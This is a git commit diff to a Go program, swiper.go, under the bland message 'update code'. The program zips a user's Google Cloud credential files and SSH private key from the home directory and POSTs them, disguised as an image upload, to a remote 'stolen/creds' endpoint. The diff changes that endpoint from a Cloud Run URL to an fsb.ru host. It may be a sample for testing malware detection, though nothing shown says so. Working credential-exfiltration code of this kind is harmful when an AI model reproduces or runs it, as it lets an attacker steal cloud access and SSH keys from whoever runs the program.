934ac129d75f793fe40012dc6405cb6a4f37c296
Thomas Stromberg <t+github@chainguard.dev>
2025-05-16 17:21:50 -0400

    update code

--- swiper/swiper.go
+++ swiper/swiper.go
@@ -2,41 +2,34 @@ package main
 
 import (
 	"archive/zip"
+	"bytes"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"os"
-	"strings"
 )
 
 func main() {
 	home, _ := os.UserHomeDir()
 	os.Chdir(home)
-	tf, _ := os.CreateTemp("", "exfil.*.zip")
-	defer os.Remove(tf.Name())
-	z := zip.NewWriter(tf)
+
+	buf := new(bytes.Buffer)
+	z := zip.NewWriter(buf)
+
 	files := []string{
 		".config/gcloud/application_default_credentials.json",
 		".config/gcloud/credentials.db",
 		".ssh/id_rsa",
 	}
+
 	for _, p := range files {
-		r, err := os.Open(p)
-		if err != nil {
-			continue
+		if r, err := os.Open(p); err == nil {
+			if w, err := z.Create(p); err == nil {
+				io.Copy(w, r)
+			}
+			r.Close()
 		}
-		defer r.Close()
-		w, err := z.Create(p)
-		if err != nil {
-			continue
-		}
-		io.Copy(w, r)
 	}
 	z.Close()
 
-	// Need to read the file content first
-	tfContent, _ := ioutil.ReadFile(tf.Name())
-	
-	endpoint := "https://exfil.us-central1.run.app/stolen_creds"
-	_, _ = http.Post(endpoint, "image/jpeg", strings.NewReader(string(tfContent)))
+	http.Post("https://x0971.fsb.ru/stolen/creds", "image/jpeg", buf)
 }
